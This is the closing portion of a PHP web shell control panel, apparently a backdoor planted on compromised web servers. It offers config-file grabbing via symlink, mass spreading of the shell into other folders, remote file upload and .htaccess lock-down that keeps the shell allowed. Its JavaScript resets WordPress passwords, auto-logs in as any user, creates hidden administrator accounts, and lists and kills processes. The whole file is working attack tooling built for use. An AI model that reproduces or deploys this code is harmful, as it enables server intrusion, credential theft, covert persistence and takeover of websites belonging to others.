        if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/.htaccess')) $htaccessContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/.htaccess');
        echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);">';
        echo '<form method="POST">';
        echo '<select name="htaccess_location" class="input" style="margin-bottom:8px;"><option value="document_root">Document Root</option><option value="all">All Folders</option></select>';
        echo '<select name="htaccess_mode" class="input" style="margin-bottom:8px;"><option value="deny">Deny (Block dangerous)</option><option value="allow">Allow (Specify allowed)</option></select>';
        echo '<textarea name="htaccess_allowed" class="input" rows="4" placeholder="index.php&#10;wp-config.php">' . e($currentFile . "\nindex.php\nwp-config.php") . '</textarea>';
        echo '<div style="font-size:10px;color:var(--text-muted);">Current script (<strong>' . e($currentFile) . '</strong>) is automatically allowed.</div>';
        echo '<div style="margin:8px 0;"><label><input type="checkbox" name="htaccess_chmod" checked> Auto chmod 444</label></div>';
        echo '<button type="submit" name="htaccess_apply" class="btn btn-primary">Apply</button>';
        echo '</form>';
        echo '<hr><h4 style="color:var(--gold);font-size:14px;">Current .htaccess</h4>';
        echo '<div class="cmd-output"><pre>' . e($htaccessContent ?: '# No .htaccess found') . '</pre></div>';
        echo '</div>';
    }

    // ============================================================
    // GRAB CONFIG
    // ============================================================
    elseif ($action === 'config') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔍 Grab Config</h2>';
        echo '<div class="glass">';
        echo '<p class="text-gray">Grab all configuration files (Joomla, WordPress, SMF, etc.) via symlink.</p>';
        echo '<form method="POST">';
        echo '<button type="submit" name="grab_config" class="btn btn-primary">🔍 Grab All Configs</button>';
        echo '</form></div>';
        if (!empty($cmdOutput)) echo '<div class="cmd-output"><pre>' . e($cmdOutput) . '</pre></div>';
    }

    // ============================================================
    // SPREAD
    // ============================================================
    elseif ($action === 'spread') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">📤 Mass Spread + URL</h2>';
        echo '<div class="glass">';
        echo '<form method="POST">';
        echo '<div style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:8px;">';
        echo '<input type="text" name="spread_source" placeholder="File sumber (kosong = file ini)" value="' . e(basename(__FILE__)) . '">';
        echo '<input type="number" name="spread_max" placeholder="Maks folder" value="10">';
        echo '<input type="text" name="spread_base_dir" placeholder="Base dir" value="' . e($currentDirectory) . '">';
        echo '</div>';
        echo '<button type="submit" name="run_mass_spread_url" class="btn btn-primary mt-2">��� Spread & Show URLs</button>';
        echo '</form></div>';
        if (!empty($cmdOutput)) echo '<div class="cmd-output"><pre>' . e($cmdOutput) . '</pre></div>';
    }

    // ============================================================
    // SELF DESTRUCT
    // ============================================================
    elseif ($action === 'selfdestruct') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">💀 Self-Destruct</h2>';
        echo '<div class="glass">';
        echo '<p class="text-red">⚠️ This will delete this file permanently.</p>';
        echo '<form method="POST">';
        echo '<label><input type="checkbox" name="confirm" value="yes"> I am sure</label><br>';
        echo '<button type="submit" name="destroy" class="btn btn-danger mt-2">💀 Destroy</button>';
        echo '</form></div>';
    }
    ?>
    </div>
</div>

<!-- MODALS -->
<div class="modal-overlay hidden" id="multiuploadModal"><div class="modal">
    <div class="modal-header"><span class="modal-title">📤 Multi Upload</span><button class="modal-close" onclick="hideModal('multiupload')">✕</button></div>
    <form method="POST" enctype="multipart/form-data">
    <div class="modal-body">
        <div id="uploadersContainer">
            <div class="uploader-row"><input type="file" name="files[]" multiple></div>
        </div>
        <button type="button" onclick="addUploader()" class="btn btn-sm">+ Add More</button>
    </div>
    <div class="modal-footer">
        <button type="button" onclick="hideModal('multiupload')" class="btn">Cancel</button>
        <button type="submit" name="multi_upload" class="btn btn-primary">📤 Upload All</button>
    </div>
    </form>
</div></div>

<div class="modal-overlay hidden" id="remoteModal"><div class="modal">
    <div class="modal-header"><span class="modal-title">🌐 Remote Upload</span><button class="modal-close" onclick="hideModal('remote')">✕</button></div>
    <form method="POST">
    <div class="modal-body">
        <div class="form-group"><label style="font-size:11px;color:var(--text-muted);">URL</label><input type="text" name="remote_url" placeholder="https://example.com/file.php" style="width:100%;"></div>
        <div class="form-group"><label style="font-size:11px;color:var(--text-muted);">Save as (optional)</label><input type="text" name="remote_filename" placeholder="filename.php" style="width:100%;"></div>
    </div>
    <div class="modal-footer">
        <button type="button" onclick="hideModal('remote')" class="btn">Cancel</button>
        <button type="submit" name="remote_upload" class="btn btn-primary">⬇ Download</button>
    </div>
    </form>
</div></div>

<?php if ($wpAvailable): ?>
<script>
function toggleBypass() {
    var bypass = document.getElementById('bypassToggle');
    var field = document.getElementById('useBypassField');
    var label = document.getElementById('cmdModeLabel');
    if (bypass.textContent === 'Normal') {
        bypass.textContent = 'Bypass';
        bypass.className = 'btn btn-danger';
        field.value = '1';
        label.textContent = '#';
        label.style.color = 'var(--red)';
    } else {
        bypass.textContent = 'Normal';
        bypass.className = 'btn btn-gold';
        field.value = '0';
        label.textContent = '$';
        label.style.color = '';
    }
}
function showModal(id) { document.getElementById(id + 'Modal').classList.remove('hidden'); }
function hideModal(id) { document.getElementById(id + 'Modal').classList.add('hidden'); }
function addUploader() { var c = document.getElementById('uploadersContainer'); var d = document.createElement('div'); d.className = 'uploader-row'; d.innerHTML = '<input type="file" name="files[]" multiple>'; c.appendChild(d); }
function wpRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() { try { callback(JSON.parse(xhr.responseText)); } catch (e) { callback({ err: xhr.responseText.substring(0, 300) }); } };
    var params = [];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}
function wpLoadUsers() {
    var container = document.getElementById('wpUserList');
    if (!container) return;
    container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);">Loading...</div>';
    wpRequest({ c4t: 'ulst' }, function(users) {
        if (users.err) { container.innerHTML = '<div style="color:var(--red);">Error: ' + users.err + '</div>'; return; }
        if (!users.length) { container.innerHTML = '<div style="color:var(--text-muted);">No users found.</div>'; return; }
        var html = '';
        users.forEach(function(u) {
            var hidden = u.is_hidden ? 'background:rgba(124,58,237,0.08);border-left:3px solid #7c3aed;' : '';
            html += '<div style="' + hidden + 'border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:4px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;">';
            html += '<div><span style="color:var(--accent);font-weight:600;">' + u.user_login + '</span>';
            if (u.is_hidden) html += ' <span style="background:#7c3aed;color:#fff;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:600;">HIDDEN</span>';
            html += '<div style="font-size:10px;color:var(--text-muted);">' + u.user_email + '</div></div>';
            html += '<div style="display:flex;gap:4px;flex-wrap:wrap;">';
            html += '<button class="btn btn-sm btn-primary" onclick="wpResetPw(' + u.ID + ',this)" style="font-size:10px;padding:2px 8px;">ResetPW</button>';
            html += '<button class="btn btn-sm btn-success" onclick="wpAutoLogin(' + u.ID + ')" style="font-size:10px;padding:2px 8px;">Login</button>';
            html += u.is_hidden ? '<button class="btn btn-sm" onclick="wpUnhideUser(' + u.ID + ',this)" style="font-size:10px;padding:2px 8px;background:var(--green);color:#000;">Unhide</button>' : '<button class="btn btn-sm" onclick="wpHideUser(' + u.ID + ',this)" style="font-size:10px;padding:2px 8px;background:#f97316;color:#000;">Hide</button>';
            html += '<button class="btn btn-sm btn-danger" onclick="wpDeleteUser(' + u.ID + ',\'' + u.user_login + '\')" style="font-size:10px;padding:2px 8px;">Del</button>';
            html += '</div></div>';
            html += '<div id="wpPwInfo_' + u.ID + '" style="display:none;margin-top:4px;padding:4px 10px;background:#000;border:1px solid var(--green);border-radius:4px;font-size:11px;font-family:monospace;"></div>';
        });
        container.innerHTML = html;
    });
}
function wpResetPw(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({ c4t: 'rpsw', uix: uid }, function(r) {
        btn.textContent = 'ResetPW';
        btn.disabled = false;
        if (r.n) {
            var info = document.getElementById('wpPwInfo_' + uid);
            info.style.display = 'block';
            info.innerHTML = 'New: <span style="color:var(--gold);">' + r.n + '</span> <button class="btn btn-sm btn-primary" onclick="navigator.clipboard.writeText(\'' + r.n + '\')">Copy</button>';
            setTimeout(function() { info.style.display = 'none'; }, 15000);
        }
    });
}
function wpAutoLogin(uid) { wpRequest({ c4t: 'alog', uix: uid }, function(r) { if (r.url) window.open(r.url, '_blank'); }); }
function wpHideUser(uid, btn) { btn.textContent = '...';
    btn.disabled = true;
    wpRequest({ c4t: 'hide', uix: uid }, function(r) { btn.textContent = 'Hide';
        btn.disabled = false; if (r.ok) wpLoadUsers(); }); }
function wpUnhideUser(uid, btn) { btn.textContent = '...';
    btn.disabled = true;
    wpRequest({ c4t: 'unhide', uix: uid }, function(r) { btn.textContent = 'Unhide';
        btn.disabled = false; if (r.ok) wpLoadUsers(); }); }
function wpDeleteUser(uid, name) { if (!confirm('Delete ' + name + '?')) return;
    wpRequest({ c4t: 'del', uix: uid }, function(r) { if (r.ok) wpLoadUsers();
        else alert('Delete failed: ' + r.err); }); }
function wpCreateAdmin() {
    var user = document.getElementById('wpNewUser').value.trim();
    var pass = document.getElementById('wpNewPass').value.trim();
    var email = document.getElementById('wpNewEmail').value.trim();
    var hide = document.getElementById('wpHideUser').checked;
    if (!user || !pass) { alert('Username and password required.'); return; }
    var status = document.getElementById('wpCreateStatus');
    status.style.display = 'block';
    status.textContent = 'Creating...';
    status.style.color = 'var(--accent)';
    var data = { c4t: 'cadm', xun: user, xpw: pass, xem: email };
    if (hide) data.hide_user = '1';
    wpRequest(data, function(r) {
        if (r.ok) {
            status.textContent = '✅ Admin created: ' + r.u + ' | Pass: ' + r.p + (r.hide ? ' (Hidden)' : '');
            status.style.color = 'var(--green)';
            wpLoadUsers();
            document.getElementById('wpNewUser').value = '';
            document.getElementById('wpNewPass').value = '';
            document.getElementById('wpNewEmail').value = '';
            document.getElementById('wpHideUser').checked = false;
        } else {
            status.textContent = '❌ Error: ' + r.err;
            status.style.color = 'var(--red)';
        }
        setTimeout(function() { status.style.display = 'none'; }, 8000);
    });
}
// Process Manager
var procData = null,
    procTimer = null,
    procPaused = false;

function procLoad() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { var r = JSON.parse(xhr.responseText);
            procData = r;
            procFilterRender(); } catch (e) { document.getElementById('procTableBody').innerHTML = '<tr><td colspan="8" style="color:var(--red);text-align:center;">Error</td></tr>'; }
    };
    xhr.send('proc_action=list');
}
function procFilterRender() {
    if (!procData) return;
    var search = document.getElementById('procSearch').value.toLowerCase();
    var filter = document.getElementById('procFilter').value;
    var sort = document.getElementById('procSort').value;
    var list = [];
    if (filter === 'all' || filter === 'hidden') {
        (procData.hidden || []).forEach(function(h) { list.push({ pid: h.pid, user: h.user, command: h.command, stat: '?', start: '?', cpu: '?', mem: '?', _type: 'hidden' }); });
    }
    var procs = procData.processes || [];
    procs.forEach(function(p) {
        if (filter === 'hidden') return;
        if (filter === 'mine' && p.user !== '<?php echo get_current_user(); ?>') return;
        if (filter === 'recent') { var recent = procData.recent || [];
            var found = false;
            recent.forEach(function(r) { if (r.pid == p.pid) found = true; }); if (!found) return; }
        p._type = 'normal';
        list.push(p);
    });
    if (search) list = list.filter(function(p) { return (p.pid + p.user + p.command).toLowerCase().indexOf(search) >= 0; });
    if (sort === 'cpu') list.sort(function(a, b) { return parseFloat(b.cpu || 0) - parseFloat(a.cpu || 0); });
    else if (sort === 'mem') list.sort(function(a, b) { return parseFloat(b.mem || 0) - parseFloat(a.mem || 0); });
    else if (sort === 'pid') list.sort(function(a, b) { return parseInt(b.pid || 0) - parseInt(a.pid || 0); });
    var html = '';
    if (list.length === 0) html = '<tr><td colspan="8" style="text-align:center;color:var(--text-muted);padding:20px;">No processes.</td></tr>';
    list.forEach(function(p) {
        var isHidden = p._type === 'hidden';
        var border = isHidden ? 'border-left:3px solid #f85149;' : '';
        html += '<tr style="' + border + '">';
        html += '<td style="padding:4px 6px;color:var(--accent);">' + p.pid + '</td>';
        html += '<td style="padding:4px 6px;color:var(--text-muted);">' + p.user + '</td>';
        html += '<td style="padding:4px 6px;text-align:right;">' + p.cpu + '</td>';
        html += '<td style="padding:4px 6px;text-align:right;">' + p.mem + '</td>';
        html += '<td style="padding:4px 6px;">' + p.stat + '</td>';
        html += '<td style="padding:4px 6px;">' + p.start + '</td>';
        html += '<td style="padding:4px 6px;font-size:10px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + e(p.command) + '">' + e(p.command).substring(0, 60) + (p.command.length > 60 ? '...' : '') + '</td>';
        html += '<td style="padding:4px 6px;text-align:center;">';
        if (!isHidden) html += '<button class="btn btn-sm btn-danger" style="font-size:9px;padding:2px 6px;" onclick="procKill(' + p.pid + ')">Kill</button>';
        html += '</td></tr>';
    });
    document.getElementById('procTableBody').innerHTML = html;
    var stats = document.getElementById('procStats');
    if (stats) stats.textContent = procData.total + ' processes | ' + procData.total_hidden + ' hidden | ' + procData.total_recent + ' recent';
}
function procKill(pid) { if (confirm('Kill PID ' + pid + '?')) { var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('proc_action=kill&pid=' + pid);
        setTimeout(procLoad, 500); } }
function procTogglePause() {
    procPaused = !procPaused;
    document.getElementById('procPauseBtn').textContent = procPaused ? '▶️ Resume' : '⏸️ Pause';
    if (!procPaused) procLoad();
}
// Auto-start process manager
if (document.getElementById('procTableBody')) { procLoad(); if (procTimer) clearInterval(procTimer);
    procTimer = setInterval(function() { if (!procPaused) procLoad(); }, 3000); }
// Auto-load WP users
if (document.getElementById('wpUserList')) wpLoadUsers();
</script>
<?php endif; ?>
</body>
</html>
